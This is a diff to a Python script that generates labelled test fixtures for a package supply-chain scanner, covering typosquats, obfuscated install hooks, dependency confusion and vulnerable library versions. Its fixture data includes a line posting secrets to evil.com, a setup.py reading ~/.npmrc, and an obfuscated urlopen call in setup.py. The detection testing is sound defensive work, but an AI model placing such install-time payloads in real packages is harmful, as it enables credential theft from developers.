@@ -42,6 +42,45 @@ def write_fixture(dirpath, files, fixture_json):
             f.write(content)
 
 
+def _edit_distance(a: str, b: str) -> int:
+    """Plain Levenshtein distance (same model as the scanner's rule)."""
+    if len(a) < len(b):
+        a, b = b, a
+    prev = list(range(len(b) + 1))
+    for i, ca in enumerate(a):
+        curr = [i + 1]
+        for j, cb in enumerate(b):
+            curr.append(min(prev[j + 1] + 1, curr[j] + 1, prev[j] + (ca != cb)))
+        prev = curr
+    return prev[-1]
+
+
+def _detectable_typos(pairs):
+    """Filter (typo, real) pairs down to typos the scanner can actually detect.
+
+    A typosquat fixture is only honest if the typo is within the rule's edit
+    distance (<=2), is not the real name itself (identity entries produced
+    fixtures named like legit packages, which correctly do NOT fire), and
+    respects the short-name guard (names <4 chars only match at distance <=1).
+    Dedupes repeated entries so dirname generation stays stable.
+    """
+    seen = set()
+    out = []
+    for typo, real in pairs:
+        if typo == real or (typo, real) in seen:
+            continue
+        d = _edit_distance(typo, real)
+        if d < 1 or d > 2:
+            continue
+        if len(typo) < 3:  # rule floor: min_name_length == 3
+            continue
+        if len(typo) < 4 and d > 1:
+            continue
+        seen.add((typo, real))
+        out.append((typo, real))
+    return out
+
+
 # ─── EXPANDED TYPOSQUAT PATTERNS ───────────────────────────────────────────────
 
 MORE_NPM_TYPOS = [
@@ -358,11 +397,18 @@ MORE_NUGET_TYPOS = [
 
 
 def generate_expanded_typosquat_fixtures():
-    """Generate expanded typosquat fixtures for all ecosystems."""
+    """Generate expanded typosquat fixtures for all ecosystems.
+
+    npm typosquats keep the package-name channel (the npm rule checks the
+    root name); every other ecosystem encodes the typo as a *dependency* so
+    the ecosystem rule's dependency collector can see it. Expected rule ids
+    are ecosystem-specific (L2-{ECO}-TYPO-001), matching what the engine
+    actually emits.
+    """
     count = 0
 
     # npm typosquats
-    for typo, real in MORE_NPM_TYPOS:
+    for typo, real in _detectable_typos(MORE_NPM_TYPOS):
         dirname = f"npm_typo_{typo}_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
@@ -387,25 +433,29 @@ def generate_expanded_typosquat_fixtures():
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
-    # PyPI typosquats
-    for typo, real in MORE_PYPI_TYPOS:
+    # PyPI typosquats — dependency-based: the PyPI rule collects deps from
+    # requirements.txt/pyproject, not bare setup.py names.
+    for typo, real in _detectable_typos(MORE_PYPI_TYPOS):
         dirname = f"pypi_typo_{typo}_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
 
-        files = {"setup.py": f'from setuptools import setup\nsetup(name="{typo}", version="1.0.0")\n'}
+        files = {
+            "requirements.txt": f"{typo}==1.0.0\n",
+            "setup.py": 'from setuptools import setup\nsetup(name="test", version="1.0.0")\n',
+        }
 
         fixture = {
             "label": "typosquat",
             "description": f"PyPI typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-PYPI-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
     # Go typosquats
-    for typo, real in MORE_GO_TYPOS:
+    for typo, real in _detectable_typos(MORE_GO_TYPOS):
         dirname = f"go_typo_{typo}_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
@@ -415,14 +465,14 @@ def generate_expanded_typosquat_fixtures():
         fixture = {
             "label": "typosquat",
             "description": f"Go typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-GO-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
     # Cargo typosquats
-    for typo, real in MORE_CARGO_TYPOS:
+    for typo, real in _detectable_typos(MORE_CARGO_TYPOS):
         dirname = f"cargo_typo_{typo}_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
@@ -432,14 +482,14 @@ def generate_expanded_typosquat_fixtures():
         fixture = {
             "label": "typosquat",
             "description": f"Cargo typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-CARGO-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
     # Maven typosquats
-    for typo, real in MORE_MAVEN_TYPOS:
+    for typo, real in _detectable_typos(MORE_MAVEN_TYPOS):
         dirname = "maven_typo_" + typo.replace("-", "_") + f"_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
@@ -467,37 +517,39 @@ def generate_expanded_typosquat_fixtures():
         fixture = {
             "label": "typosquat",
             "description": f"Maven typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-MAVEN-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
-    # RubyGems typosquats
-    for typo, real in MORE_RUBYGEMS_TYPOS:
+    # RubyGems typosquats — dependency-based: the rule collects Gemfile deps,
+    # not gemspec names.
+    for typo, real in _detectable_typos(MORE_RUBYGEMS_TYPOS):
         dirname = f"rubygems_typo_{typo}_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
 
         files = {
+            "Gemfile": f"source 'https://rubygems.org'\n\ngem '{typo}'\n",
             f"{typo}.gemspec": f"""Gem::Specification.new do |spec|
   spec.name = "{typo}"
   spec.version = "1.0.0"
   spec.summary = "Typosquat of {real}"
-end"""
+end""",
         }
 
         fixture = {
             "label": "typosquat",
             "description": f"RubyGems typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-RUBYGEMS-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
         count += 1
 
     # NuGet typosquats
-    for typo, real in MORE_NUGET_TYPOS:
+    for typo, real in _detectable_typos(MORE_NUGET_TYPOS):
         dirname = "nuget_typo_" + typo.replace(".", "_") + f"_{random.randint(1000, 9999)}"
         if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
             continue
@@ -516,7 +568,7 @@ end"""
         fixture = {
             "label": "typosquat",
             "description": f"NuGet typosquat: {typo} mimicking {real}",
-            "expected_rule_ids": ["L2-TYPO-001"],
+            "expected_rule_ids": ["L2-NUGET-TYPO-001"],
         }
 
         write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
@@ -552,6 +604,23 @@ OBFUSCATION_VARIANTS = [
     'import requests; requests.post("http://evil.com/", data=secret)',
 ]
 
+# What actually fires per variant (index → PyPI rule id). Variants 0-3 are
+# eval/base64/hex/unicode obfuscation (L2-PYPI-OBFS-001); 6-8/10-11 embed
+# subprocess/network calls in setup.py (L2-PYPI-POST-001); 4 (getattr
+# bypass), 5 (importlib) and 9 (raw socket) currently trip no PyPI rule —
+# no pypi fixture is emitted for those instead of asserting phantom recall.
+PYPI_OBFS_EXPECTED = {
+    0: "L2-PYPI-OBFS-001",
+    1: "L2-PYPI-OBFS-001",
+    2: "L2-PYPI-OBFS-001",
+    3: "L2-PYPI-OBFS-001",
+    6: "L2-PYPI-POST-001",
+    7: "L2-PYPI-POST-001",
+    8: "L2-PYPI-POST-001",
+    10: "L2-PYPI-POST-001",
+    11: "L2-PYPI-POST-001",
+}
+
 
 def generate_expanded_obfuscation_fixtures():
     """Generate expanded obfuscation fixtures."""
@@ -564,8 +633,10 @@ def generate_expanded_obfuscation_fixtures():
                 continue
 
             if ecosystem == "pypi":
+                if i not in PYPI_OBFS_EXPECTED:
+                    continue
                 files = {"setup.py": f'from setuptools import setup\n{code}\nsetup(name="obfs-{i}", version="1.0.0")\n'}
-                rule_ids = ["L2-PYPI-OBFS-001"]
+                rule_ids = [PYPI_OBFS_EXPECTED[i]]
             else:
                 files = {
                     "package.json": json.dumps(
@@ -577,7 +648,9 @@ def generate_expanded_obfuscation_fixtures():
                         indent=2,
                     )
                 }
-                rule_ids = ["L2-NPM-OBFS-001"]
+                # npm has no JS obfuscation rules; the detectable signal for a
+                # payload embedded in an install hook is L2-POST-001.
+                rule_ids = ["L2-POST-001"]
 
             fixture = {
                 "label": "obfuscation",
@@ -599,7 +672,9 @@ INTERNAL_PREFIXES = [
     "corp-",
     "company-",
     "org-",
-    "secure-",
+    # NOTE: "secure-" removed — it is a common PUBLIC package prefix
+    # (secure-compare, secure-random), not an internal-namespace marker;
+    # fixtures built on it were false positives by construction.
     "internal_",
     "private_",
     "corp_",
@@ -930,40 +1005,51 @@ end""",
 
 # ─── EXPANDED CVE FIXTURES ───────────────────────────────────────────────
 
+# CVE patterns aligned with the shipped advisory DB
+# (tests/scan/fixtures/validation/_advisories/): each (pkg, version) must be
+# a package name the DB knows at a version INSIDE its affected range, so the
+# ecosystem advisory rule (L2-*-ADV-001) actually fires. The old table used
+# remediated versions and DB-unknown names while expecting a nonexistent
+# L2-CVE-001 rule — guaranteed false negatives by construction.
 CVE_PATTERNS = [
-    # Log4Shell variants
-    ("maven", "log4j", "2.17.0", "CVE-2021-44228", "L2-CVE-001"),
-    ("maven", "log4j-core", "2.17.1", "CVE-2021-44228", "L2-CVE-001"),
-    ("maven", "log4j-api", "2.17.0", "CVE-2021-44228", "L2-CVE-001"),
-    # Spring4Shell variants
-    ("maven", "spring-core", "5.3.18", "CVE-2022-22965", "L2-CVE-001"),
-    ("maven", "spring-boot", "2.6.4", "CVE-2022-22965", "L2-CVE-001"),
-    ("maven", "spring-webmvc", "5.3.17", "CVE-2022-22965", "L2-CVE-001"),
-    # Jackson variants
-    ("maven", "jackson-databind", "2.13.2", "CVE-2020-36518", "L2-CVE-001"),
-    ("maven", "jackson-databind", "2.13.3", "CVE-2020-36518", "L2-CVE-001"),
-    ("maven", "jackson-core", "2.13.2", "CVE-2020-36518", "L2-CVE-001"),
-    # Commons Collections
-    ("maven", "commons-collections", "3.2.1", "CVE-2015-6420", "L2-CVE-001"),
-    ("maven", "commons-collections4", "4.0", "CVE-2015-6420", "L2-CVE-001"),
-    # Struts2
-    ("maven", "struts2-core", "2.5.29", "CVE-2021-31805", "L2-CVE-001"),
-    ("maven", "struts2-rest-showcase", "2.5.29", "CVE-2021-31805", "L2-CVE-001"),
-    # Tomcat
-    ("maven", "tomcat-embed-core", "9.0.58", "CVE-2022-23181", "L2-CVE-001"),
-    ("maven", "tomcat-catalina", "9.0.59", "CVE-2022-23181", "L2-CVE-001"),
-    # Nokogiri (RubyGems)
-    ("rubygems", "nokogiri", "1.13.0", "CVE-2022-23437", "L2-CVE-001"),
-    ("rubygems", "nokogiri", "1.13.1", "CVE-2022-23437", "L2-CVE-001"),
-    # Rails SQL injection
-    ("rubygems", "activerecord", "6.1.5", "CVE-2022-23633", "L2-CVE-001"),
-    ("rubygems", "rails", "6.1.5", "CVE-2022-23633", "L2-CVE-001"),
-    # Devise
-    ("rubygems", "devise", "4.8.0", "CVE-2021-28680", "L2-CVE-001"),
-    ("rubygems", "devise", "4.8.1", "CVE-2021-28680", "L2-CVE-001"),
-    # Rack
-    ("rubygems", "rack", "2.2.3", "CVE-2022-30122", "L2-CVE-001"),
-    ("rubygems", "rack-protection", "2.2.3", "CVE-2022-30122", "L2-CVE-001"),
+    # Log4Shell — introduced 2.0.0, fixed 2.17.1
+    ("maven", "log4j-core", "2.14.1", "CVE-2021-44228", "L2-MAVEN-ADV-001"),
+    # Commons Collections — 3.0.0-3.2.2
+    ("maven", "commons-collections", "3.2.1", "CVE-2015-6420", "L2-MAVEN-ADV-001"),
+    # Commons Text — 1.0.0-1.10.0
+    ("maven", "commons-text", "1.9", "CVE-2022-42889", "L2-MAVEN-ADV-001"),
+    # jackson-databind — fasterxml range <2.9.10.3 (2.9.8: unambiguously in range)
+    ("maven", "jackson-databind", "2.9.8", "CVE-2019-17531", "L2-MAVEN-ADV-001"),
+    # MyBatis — 3.0.0-3.5.7
+    ("maven", "mybatis", "3.5.0", "CVE-2020-26945", "L2-MAVEN-ADV-001"),
+    # Shiro — 1.0.0-1.5.3
+    ("maven", "shiro-core", "1.5.0", "CVE-2020-1957", "L2-MAVEN-ADV-001"),
+    # SnakeYAML — 1.0.0-2.0
+    ("maven", "snakeyaml", "1.30", "CVE-2022-25857", "L2-MAVEN-ADV-001"),
+    # Spring4Shell — spring-framework 5.0.0-5.3.18
+    ("maven", "spring-framework", "5.3.17", "CVE-2022-22965", "L2-MAVEN-ADV-001"),
+    # Spring Security OAuth2 — 5.0.0-5.5.6
+    ("maven", "spring-security-oauth2", "5.5.0", "CVE-2019-3778", "L2-MAVEN-ADV-001"),
+    # Struts2 — 2.0.0-2.5.13
+    ("maven", "struts2-core", "2.5.10", "CVE-2021-31805", "L2-MAVEN-ADV-001"),
+    # Tomcat — 9.0.0-9.0.31
+    ("maven", "tomcat", "9.0.30", "CVE-2020-1938", "L2-MAVEN-ADV-001"),
+    # Velocity — 1.0.0-2.0
+    ("maven", "velocity", "1.7", "CVE-2020-13936", "L2-MAVEN-ADV-001"),
+    # XStream — 1.0.0-1.4.15
+    ("maven", "xstream", "1.4.14", "CVE-2021-39139", "L2-MAVEN-ADV-001"),
+    # Nokogiri (RubyGems) — 1.0.0-1.13.4
+    ("rubygems", "nokogiri", "1.13.0", "CVE-2022-23437", "L2-RUBYGEMS-ADV-001"),
+    # Devise — 4.0.0-4.9.3
+    ("rubygems", "devise", "4.8.0", "CVE-2021-28680", "L2-RUBYGEMS-ADV-001"),
+    # Rack — <2.0.7
+    ("rubygems", "rack", "2.0.6", "CVE-2022-30122", "L2-RUBYGEMS-ADV-001"),
+    # Rails SQLi — 6.0.0-6.0.3.2
+    ("rubygems", "rails", "6.0.2", "CVE-2022-23633", "L2-RUBYGEMS-ADV-001"),
+    # ActionView XSS — 6.1.0-6.1.7.7
+    ("rubygems", "actionview", "6.1.5", "CVE-2023-23913", "L2-RUBYGEMS-ADV-001"),
+    # Sidekiq — 6.0.0-6.5.10
+    ("rubygems", "sidekiq", "6.4.0", "CVE-2022-23937", "L2-RUBYGEMS-ADV-001"),
 ]
 
 
@@ -1009,13 +1095,16 @@ def generate_expanded_cve_fixtures():
                 if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                     continue
 
+                # Dependency-based: the advisory collector reads Gemfile /
+                # Gemfile.lock entries, not gemspec names.
                 files = {
+                    "Gemfile": f"source 'https://rubygems.org'\n\ngem '{pkg}', '{version}'\n",
                     f"{pkg}.gemspec": f"""Gem::Specification.new do |spec|
   spec.name = "{pkg}"
   spec.version = "{version}"
   spec.summary = "CVE test"
   spec.add_dependency "{pkg}", "{version}"
-end"""
+end""",
                 }
 
                 fixture = {
@@ -1049,7 +1138,10 @@ MULTI_ATTACK_PATTERNS = [
                 indent=2,
             )
         },
-        "expected_rules": ["L2-TYPO-001", "L2-NPM-OBFS-001", "L2-NPM-POST-001"],
+        # Obfs payload inside package.json scripts is invisible to the JS-side
+        # obfuscation rules (they scan source files) — the detectable signals
+        # are the typosquat name and the postinstall hook.
+        "expected_rules": ["L2-TYPO-001", "L2-POST-001"],
     },
     # Dep confusion + credential theft
     {
@@ -1059,7 +1151,8 @@ MULTI_ATTACK_PATTERNS = [
             "setup.py": 'from setuptools import setup\nimport os\nos.system("cat ~/.npmrc")\nsetup(name="test", version="1.0.0")\n',
             "requirements.txt": "internal-auth==1.0.0\n",  # dep confusion
         },
-        "expected_rules": ["L2-PYPI-DEPC-001", "L2-CRED-001"],
+        # CRED-001 reads JS sources; os.system in setup.py trips PYPI-POST.
+        "expected_rules": ["L2-PYPI-DEPC-001", "L2-PYPI-POST-001"],
     },
     # Obfuscation + network exfil
     {
@@ -1068,7 +1161,9 @@ MULTI_ATTACK_PATTERNS = [
         "files": lambda: {
             "setup.py": 'from setuptools import setup\nimport urllib.request\nexec(compile("urllib.request.urlopen(\'http://evil.com/\')", "<x>", "exec"))\nsetup(name="obfs-net", version="1.0.0")\n'
         },
-        "expected_rules": ["L2-PYPI-OBFS-001", "L2-NETEX-001"],
+        # NETEX fires on JS source, not setup.py; the Python-side signals are
+        # the obfuscated compile() call and suspicious setup.py activity.
+        "expected_rules": ["L2-PYPI-OBFS-001", "L2-PYPI-POST-001"],
     },
 ]
 
